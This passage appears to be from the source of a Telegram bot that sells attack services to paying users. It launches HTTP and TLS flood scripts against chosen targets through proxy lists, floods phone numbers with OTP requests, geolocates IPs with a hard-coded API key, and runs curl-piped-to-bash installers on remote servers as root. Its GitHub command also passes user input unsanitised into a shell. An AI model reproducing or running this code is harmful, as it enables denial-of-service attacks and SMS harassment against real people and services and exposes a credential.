            bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­Юў┤­Юўх­Юў│­Юўф­Юўг­Юўд
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
     }  else if (methods === 'bypass') {
            pushOngoing(target, methods, duration);
            process = exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
             bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­ЮўБ­Юў║­Юў▒­Юўб­Юў┤­Юў┤
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
}); 
        }  else if (methods === 'storm') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­Юў┤­Юўх­Юў░­Юў│­Юў«
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
        }   else if (methods === 'kill') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­Юўг­Юўф­ЮўГ­ЮўГ
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
        }   else if (methods === 'cas') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­Юўц­Юўб­Юў┤
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
        } else if (methods === 'pidoras') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­Юў▒­Юўф­ЮўЦ­Юў░­Юў│­Юўб­Юў┤
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
        }   else if (methods === 'tlsvip') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­Юўх­ЮўГ­Юў┤­Юўи­Юўф­Юў▒
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
        }   else if (methods === 'glory') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­Юўе­ЮўГ­Юў░­Юў│­Юў║
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
        } else if (methods === 'h2-flash') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­ЮўЕ2-­ЮўД­ЮўГ­Юўб­Юў┤­ЮўЕ
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
        } else if (methods === 'h2-flood') {
       pushOngoing(target, methods, duration);
       process = exec(`node ${metode} ${target} ${duration} 100 10 proxt.txt`);
       bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­Юўќ­Юўх­Юўб­Юў╣ ­ЮўІ­ЮўЦ­Юў░­Юў┤ ! Рюў
РЎЏ Лєлхл╗Лї  : ${target}
РЎЏ л╝лхЛѓлЙл┤ : ­ЮўЕ2-­ЮўД­ЮўГ­Юў░­Юў░­ЮўЦ
РЎЏ ЛЂЛѓл░ЛѓЛЃЛЂ : ${duration} 
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ Рюў....
\`\`\``,
    parse_mode: "Markdown"
});
        }  else {
             bot.sendMessage('Metode serangan tidak valid.');
             return
        } 
	    
          if (!attackProcesses[target]) {
             attackProcesses[target] = {};
          }
          attackProcesses[target][chatId] = process;

        process.on('exit', (code) => {
            console.log(`Proses selesai dengan kode: ${code}`);
             bot.sendMessage(
                 `Attack selesai | Code: ${code}`,  
                {
                    chat_id: chatId,
                    message_id:  messageIdToEdit, 
                   });
            
                delete attackProcesses[target][chatId];  
                 if (Object.keys(attackProcesses[target]).length === 0) {
                         delete attackProcesses[target]; 
                   }
        });
         
          process.stderr.on('data', (data) => {
              console.error(`stderr: ${data}`);
             
               bot.sendMessage(chatId, `Error: ${data}`);
          });
    } catch (error) {
       console.error('Terjadi kesalahan:', error);
       	bot.sendMessage(chatId, `Terjadi kesalahan: ${error.message}`);

    }
}

bot.onText(/\/O-Attack (.+)/, (msg, match) => {       
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return; 
    const args = match[1].split(' '); 
    
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

    handleAttackCommand(chatId, args);  
});
// track ip
async function trackIP(msg, args) {
    const chatId = msg.chat.id;

    if (args.length < 1) {
        const message = `Contoh: \`/trackip <ip address>\`\n/trackip 1.1.1.1`;
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }); 
        sigma();
        return;
    }

    const [target] = args;

    if (target === '0.0.0.0') {
        bot.sendMessage(chatId, 'Jangan Di Ulangi Manis Nanti Di Delete User Mu');
        sigma();
        return;
    }

    try {
        const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696'; 
        const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
        const res = await fetch(`https://ipwho.is/${target}`);

        if (!response.ok || !res.ok) {
            throw new Error(`Gagal mengambil data IP. Status: ${response.status} or ${res.status}`);
        }

        const additionalInfo = await res.json();
        const ipInfo = await response.json();

        
        if (!ipInfo || typeof ipInfo !== 'object' || Object.keys(ipInfo).length === 0) {
             throw new Error('Data dari api.ipgeolocation.io tidak valid.');
        }
        if (!additionalInfo || typeof additionalInfo !== 'object' || Object.keys(additionalInfo).length === 0) {
            throw new Error('Data dari ipwho.is tidak valid');
        }

        const message = `Informasi IP untuk ${target}:\n` +
            `- Flags: ${ipInfo.country_flag || 'N/A'}\n` + 
           `- Country: ${ipInfo.country_name || 'N/A'}\n` +
            `- Capital: ${ipInfo.country_capital || 'N/A'}\n` +
            `- City: ${ipInfo.city || 'N/A'}\n` +
           `- ISP: ${ipInfo.isp || 'N/A'}\n` +
            `- Organization: ${ipInfo.organization || 'N/A'}\n` +
            `- Latitude: ${ipInfo.latitude || 'N/A'}\n` +
            `- Longitude: ${ipInfo.longitude || 'N/A'}\n\n` +
            `Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude || ''}+${additionalInfo.longitude || ''}`;


        bot.sendMessage(chatId, message);
        
    } catch (error) {
        console.error(`Error melacak ${target}:`, error);
        bot.sendMessage(chatId, `Error melacak ${target}.  Silakan coba lagi nanti.  Error: ${error.message}`);  
        sigma();
    }
}

bot.onText(/\/trackip (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return; ;
    const args = match[1].split(' ');
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

    trackIP(msg, args);
    bot.sendMessage(chatId, 'Bot siap digunakan.  Ketik /trackip <ip address> untuk melacak IP.');
});
// Kill Otp Number By Otax
async function killOTP(msg, args) {
    const chatId = msg.chat.id;

    if (args.length < 2) {
        const message = `Contoh: \`/killotp <target> <duration>\`\n/killotp 628xxx 120`; // Format perintah
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }); // Gunakan Markdown untuk formatting
        sigma();
        return;
    }

    const [target, duration] = args;

    if (isNaN(duration) || parseInt(duration) <= 0) {
        bot.sendMessage(chatId, 'Durasi harus berupa angka positif.');
        sigma();
        return;
    }

    try {
        const messageBefore = `Target   : ${target}\nDuration : ${duration}\n\nMencoba meminta kode OTP.`; // Perbarui pesan
        bot.sendMessage(chatId, messageBefore);

        // Ubah path agar lebih relatif dan aman.
        const filePath = path.resolve(__dirname, 'otaxddos', 'Temp.js'); // Gunakan path.resolve
        // Perintah yang akan dieksekusi.  Perhatikan tanda kutip.
        const command = `node "${filePath}" "${target}" "${duration}"`;
        console.log(`Menjalankan perintah: ${command}`); // Logging perintah untuk debugging

        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error menjalankan killOTP: ${error}`);
                bot.sendMessage(chatId, `Terjadi kesalahan saat mencoba meminta kode OTP.  Periksa log bot.`); // Pesan yang lebih informatif
                // Tambahkan informasi lebih detail. Apakah error kode atau lainnya?
                if (error.code) {
                    bot.sendMessage(chatId, `Kode error: ${error.code}`);
                }
            } else {
                console.log(`killOTP berhasil (seharusnya).  Target: ${target}, Durasi: ${duration}`);
                bot.sendMessage(chatId, `Permintaan kode OTP berhasil (semoga saja!). Periksa ponsel Anda.`); // Pesan yang baik
            }
            // Opsional:
            if (stdout) console.log('stdout:', stdout);
            if (stderr) console.error('stderr:', stderr);
            sigma();
        }); // exec
    } catch (error) {
        console.error('Kesalahan dalam handler killOTP:', error);
        bot.sendMessage(chatId, 'Terjadi kesalahan internal saat mencoba meminta kode OTP.  Silakan coba lagi nanti.');
        sigma();
    }
}

bot.onText(/\/killotp (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return; 
    const args = match[1].split(' ');
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

    killOTP(msg, args);
});

// tools ambil github
const execAsync = util.promisify(exec);

bot.onText(/^(\/github)\s+(.*)/i, async (m, match) => {
  const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return; 
    const args = match[1].split(' ');  
    const repoURL = match[2]; // Dapatkan URL repositori GitHub

    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
        if (!repoURL) {
            return bot.sendMessage(chatId, 'Mohon berikan URL repositori GitHub!', { reply_to_message_id: msg.message_id });
        }
        if (!repoURL.startsWith('https://github.com/')) {
            return bot.sendMessage(chatId, 'URL repositori tidak valid.', { reply_to_message_id: msg.message_id });
        }

        const chatId = chatId;
        const repoName = repoURL.split('/').slice(-1)[0];
        const toolDirectory = path.join(__dirname, 'github_tools', repoName);

        // 1. Unduh Repositori
        await bot.sendChatAction(chatId, 'typing'); // Menunjukkan sedang mengetik

        try {
            if (!fs.existsSync(toolDirectory)) {
                fs.mkdirSync(toolDirectory, { recursive: true });
            }
            await execAsync(`git clone ${repoURL} ${toolDirectory}`);
            await bot.sendMessage(chatId, `Mengunduh alat dari ${repoURL}...`, { reply_to_message_id: msg.message_id });

        } catch (cloneError) {
            console.error('Kesalahan saat mengunduh:', cloneError);
            return bot.sendMessage(chatId, `Gagal mengunduh alat.  ${cloneError.message}`, { reply_to_message_id: msg.message_id });
        }

        // 2. Kirim Berkas
        try {
            const files = await fs.promises.readdir(toolDirectory);

            if (files.length === 0) {
                await bot.sendMessage(chatId, `Tidak ada berkas yang ditemukan di ${repoName}.`, { reply_to_message_id: msg.message_id });
                // Hapus direktori jika tidak ada berkas
                try {
                    await fs.rm(toolDirectory, { recursive: true, force: true });
                    console.log(`Direktori kosong dihapus: ${toolDirectory}`);
                } catch (rmError) {
                    console.error('Gagal menghapus direktori kosong:', rmError);
                }
                return;
            }

            for (const file of files) {
                const filePath = path.join(toolDirectory, file);
                const fileStat = await fs.promises.stat(filePath);

                if (fileStat.isFile()) {
                    try {
                        if (file.endsWith('.png') || file.endsWith('.jpg') || file.endsWith('.jpeg') || file.endsWith('.gif')) {
                            await bot.sendPhoto(chatId, filePath, { caption: `Berkas: ${file}`, reply_to_message_id: msg.message_id });
                        } else {
                            await bot.sendDocument(chatId, fs.createReadStream(filePath), { filename: file, reply_to_message_id: msg.message_id });
                        }
                    } catch (sendError) {
                        
                        await bot.sendMessage(chatId, `Gagal mengirim berkas: ${file}`, { reply_to_message_id: msg.message_id });
                    }
                }
            }
            await bot.sendMessage(chatId, 'Selesai mengirim semua berkas.', { reply_to_message_id: msg.message_id });
        } catch (readDirError) {
            c
            await bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses berkas.', { reply_to_message_id: msg.message_id });
        }

        // 3. Hapus Repositori
        try {
            await fs.rm(toolDirectory, { recursive: true, force: true });
           
        } catch (rmError) {
            
            await bot.sendMessage(chatId, 'Gagal menghapus repositori. Silakan hapus secara manual.', { reply_to_message_id: msg.message_id });
        }

    } catch (err) {
        console.error('Terjadi kesalahan secara keseluruhan: ', err);
        return bot.sendMessage(chatId, 'Terjadi kesalahan secara keseluruhan saat memproses permintaan.', { reply_to_message_id: msg.message_id });
    }
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//INSTALL PANEL 2
bot.onText(/^(\.|\#|\/)installpanel$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `­ЮЌЎ­ЮЌ╝­ЮЌ┐­ЮЌ║­ЮЌ«­ЮўЂ ­Юўђ­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх!\n­ЮЌБ­ЮЌ▓­ЮЌ╗­ЮЌ┤­ЮЌ┤­Юўѓ­ЮЌ╗­ЮЌ«­ЮЌ«­ЮЌ╗: /­ЮЌХ­ЮЌ╗­Юўђ­ЮўЂ­ЮЌ«­ЮЌ╣­ЮЌ╣­ЮЌй­ЮЌ«­ЮЌ╗­ЮЌ▓­ЮЌ╣2 ­ЮЌХ­ЮЌй­ЮўЃ­ЮЌй­Юўђ,­ЮЌй­ЮЌ«­Юўђ­Юўђ­Юўё­ЮЌ╝­ЮЌ┐­ЮЌ▒­ЮўЃ­ЮЌй­Юўђ,­ЮЌ▒­ЮЌ╝­ЮЌ║­ЮЌ«­ЮЌХ­ЮЌ╗­ЮЌй­ЮЌ╗­ЮЌ╣,­ЮЌ▒­ЮЌ╝­ЮЌ║­ЮЌ«­ЮЌХ­ЮЌ╗­ЮЌ╗­ЮЌ╝­ЮЌ▒­ЮЌ▓,­ЮЪГ­ЮЪ▓­ЮЪг­ЮЪг­ЮЪг­ЮЪг­ЮЪг­ЮЪг`);
  });

bot.onText(/\/installpanel (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
const text = match[1];
const userId = msg.from.id;
  const t = text.split(',');
  
      if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
  }

  if (t.length < 3) {
    return bot.sendMessage(chatId, '­ЮЌЎ­ЮЌ╝­ЮЌ┐­ЮЌ║­ЮЌ«­ЮўЂ ­Юўђ­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх!\n­ЮЌБ­ЮЌ▓­ЮЌ╗­ЮЌ┤­ЮЌ┤­Юўѓ­ЮЌ╗­ЮЌ«­ЮЌ«­ЮЌ╗: /­ЮЌХ­ЮЌ╗­Юўђ­ЮўЂ­ЮЌ«­ЮЌ╣­ЮЌ╣­ЮЌй­ЮЌ«­ЮЌ╗­ЮЌ▓­ЮЌ╣2 ­ЮЌХ­ЮЌй­ЮўЃ­ЮЌй­Юўђ,­ЮЌй­ЮЌ«­Юўђ­Юўђ­Юўё­ЮЌ╝­ЮЌ┐­ЮЌ▒­ЮўЃ­ЮЌй­Юўђ,­ЮЌ▒­ЮЌ╝­ЮЌ║­ЮЌ«­ЮЌХ­ЮЌ╗­ЮЌй­ЮЌ╗­ЮЌ╣,­ЮЌ▒­ЮЌ╝­ЮЌ║­ЮЌ«­ЮЌХ­ЮЌ╗­ЮЌ╗­ЮЌ╝­ЮЌ▒­ЮЌ▓,­ЮЌ┐­ЮЌ«­ЮЌ║­ЮўЃ­ЮЌй­Юўђ ( р┤ёр┤Ј╔┤р┤Џр┤Ј╩ю : ­ЮЪЙ­ЮЪХ­ЮЪХ­ЮЪХ = ╩ђр┤ђр┤Ї ­ЮЪЙ');
  }

  const ipvps = t[0];
  const passwd = t[1];
  const subdomain = t[2];
  const domainnode = t[3];
  const ramvps = t[4];

  
  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };

  const password = generateRandomPassword();
  const command = 'bash <(curl -s https://pterodactyl-installer.se)';
  const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
  const conn = new Client();

  conn.on('ready', () => {
    bot.sendMessage(chatId, '­ЮЌБ­ЮЌЦ­ЮЌб­ЮЌд­ЮЌў­ЮЌд ­ЮЌБ­ЮЌў­ЮЌА­ЮЌџ­ЮЌю­ЮЌА­ЮЌд­ЮЌД­ЮЌћ­ЮЌЪ­ЮЌЪ­ЮЌћ­ЮЌА ­ЮЌд­ЮЌў­ЮЌЌ­ЮЌћ­ЮЌА­ЮЌџ ­ЮЌЋ­ЮЌў­ЮЌЦ­ЮЌЪ­ЮЌћ­ЮЌА­ЮЌџ­ЮЌд­ЮЌе­ЮЌА­ЮЌџ ­ЮЌа­ЮЌб­ЮЌЏ­ЮЌб­ЮЌА ­ЮЌД­ЮЌе­ЮЌА­ЮЌџ­ЮЌџ­ЮЌе ­ЮЪ▒-­ЮЪГ­ЮЪг­ЮЌа­ЮЌў­ЮЌА­ЮЌю­ЮЌД');
    
    conn.exec(command, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, '­ЮЌД­ЮЌ▓­ЮЌ┐­ЮЌи­ЮЌ«­ЮЌ▒­ЮЌХ ­ЮЌИ­ЮЌ▓­Юўђ­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх­ЮЌ«­ЮЌ╗ ­Юўђ­ЮЌ«­ЮЌ«­ЮўЂ ­ЮЌ║­ЮЌ▓­ЮЌ╗­ЮЌи­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌ╗­ЮЌИ­ЮЌ«­ЮЌ╗ ­ЮЌй­ЮЌ▓­ЮЌ┐­ЮЌХ­ЮЌ╗­ЮўЂ­ЮЌ«­ЮЌх ­ЮЌХ­ЮЌ╗­Юўђ­ЮўЂ­ЮЌ«­ЮЌ╣­ЮЌ«­Юўђ­ЮЌХ.');
        conn.end();
        return;
      }

      stream.on('close', (code, signal) => {
        console.log(`Stream closed with code ${code} and signal ${signal}`);
        installWings(conn, domainnode, subdomain, password, ramvps);
      }).on('data', (data) => {
        handlePanelInstallationInput(data, stream, subdomain, password);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }).on('error', (err) => {
    // Tangani error jika koneksi gagal
    if (err.message.includes('All configured authentication methods failed')) {
      bot.sendMessage(chatId, 'Koneksi gagal: Kata sandi salah atau VPS tidak dapat diakses.');
    } else if (err.message.includes('connect ECONNREFUSED')) {
      bot.sendMessage(chatId, 'Koneksi gagal: VPS tidak bisa diakses atau mati.');
    } else {
      bot.sendMessage(chatId, `Koneksi gagal: ${err.message}`);
    }
    console.error('Connection Error: ', err.message);
  }).connect(connSettings);
  
  async function installWings(conn, domainnode, subdomain, password, ramvps) {
    bot.sendMessage(chatId, '­ЮЌБ­ЮЌЦ­ЮЌб­ЮЌд­ЮЌў­ЮЌд ­ЮЌБ­ЮЌў­ЮЌА­ЮЌџ­ЮЌю­ЮЌА­ЮЌд­ЮЌД­ЮЌћ­ЮЌЪ­ЮЌЪ­ЮЌћ­ЮЌА ­ЮЌф­ЮЌю­ЮЌА­ЮЌџ­ЮЌд ­ЮЌд­ЮЌў­ЮЌЌ­ЮЌћ­ЮЌА­ЮЌџ ­ЮЌЋ­ЮЌў­ЮЌЦ­ЮЌЪ­ЮЌћ­ЮЌА­ЮЌџ­ЮЌд­ЮЌе­ЮЌА­ЮЌџ ­ЮЌа­ЮЌб­ЮЌЏ­ЮЌб­ЮЌА ­ЮЌД­ЮЌе­ЮЌА­ЮЌџ­ЮЌџ­ЮЌе ­ЮЪ▒ ­ЮЌа­ЮЌў­ЮЌА­ЮЌю­ЮЌД');
    conn.exec(commandWings, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, '­ЮЌД­ЮЌ▓­ЮЌ┐­ЮЌи­ЮЌ«­ЮЌ▒­ЮЌХ ­ЮЌИ­ЮЌ▓­Юўђ­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх­ЮЌ«­ЮЌ╗ ­Юўђ­ЮЌ«­ЮЌ«­ЮўЂ ­ЮЌ║­ЮЌ▓­ЮЌ╗­ЮЌи­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌ╗­ЮЌИ­ЮЌ«­ЮЌ╗ ­ЮЌй­ЮЌ▓­ЮЌ┐­ЮЌХ­ЮЌ╗­ЮўЂ­ЮЌ«­ЮЌх ­ЮЌХ­ЮЌ╗­Юўђ­ЮўЂ­ЮЌ«­ЮЌ╣­ЮЌ«­Юўђ­ЮЌХ ­Юўё­ЮЌХ­ЮЌ╗­ЮЌ┤­Юўђ.');
        conn.end();
        return;
      }
      
      stream.on('close', (code, signal) => {
        console.log(`Wings installation stream closed with code ${code} and signal ${signal}`);
        createNode(conn, domainnode, ramvps, subdomain, password);
      }).on('data', (data) => {
        handleWingsInstallationInput(data, stream, domainnode, subdomain);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }

  async function createNode(conn, domainnode, ramvps, subdomain, password) {
    const command = 'bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/Installerlex/refs/heads/main/install.sh)';
